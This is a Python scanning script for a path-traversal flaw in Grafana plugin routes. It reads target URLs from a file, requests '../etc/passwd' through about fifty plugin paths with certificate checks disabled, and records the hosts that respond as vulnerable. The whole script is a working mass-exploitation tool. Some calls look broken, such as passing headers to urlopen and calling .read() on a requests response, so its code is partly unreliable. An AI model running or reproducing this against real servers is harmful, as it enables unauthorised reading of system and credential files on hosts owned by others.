import urllib.request
import requests
import ssl
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

sites = ['alertmanager','cloud-monitoring','cloudwatch',\
        'dashboard','elasticsearch','grafana','grafana-azure-monitor-datasource',\
        'graphite','influxdb','jaeger','loki','mixed','mssql','mysql','opentsdb',\
        'postgres','prometheus','tempo','testdata','zipkin','logs','grafana-clock-panel',\
        'icon','alertGroups','alertlist','annolist','barchart','bargauge','canvas','dashlist',\
        'debug','gauge','geomap','gettingstarted','graph','heatmap','histogram','live','news',\
        'nodeGraph','piechart','pluginlist','stat','state-timeline','status-history','table-old',\
        'table','text','timeseries','welcome','xychart']
def openurl(target):
    
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 1\
0.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)\
Chrome/94.0.4606.81 Safari/537.36'}

    for site in sites:
        url = target + ('/public/plugins/%s/../../../../../../../../../etc/passwd' % site)
        try:
            try:
                request = urllib.request.urlopen(url,headers=headers,timeout=5)
                response = request.read().decode('utf-8')
                
            except:
                request = requests.get(url,headers=headers,verify=False,timeout=5)
                response = request.read().decode('utf-8')
                
            if '/sbin/nologin' in response:
                print('*** %s存在漏洞' % url)
                with open('./result.txt','a') as f:
                    f.write(url)
                break
        except:
            print('***   不存在漏洞')

def main():

    with open('./urls.txt','r') as urls:
        for target in urls:
            target = target[:-1]
            openurl(target)

if __name__ == "__main__":
    main()
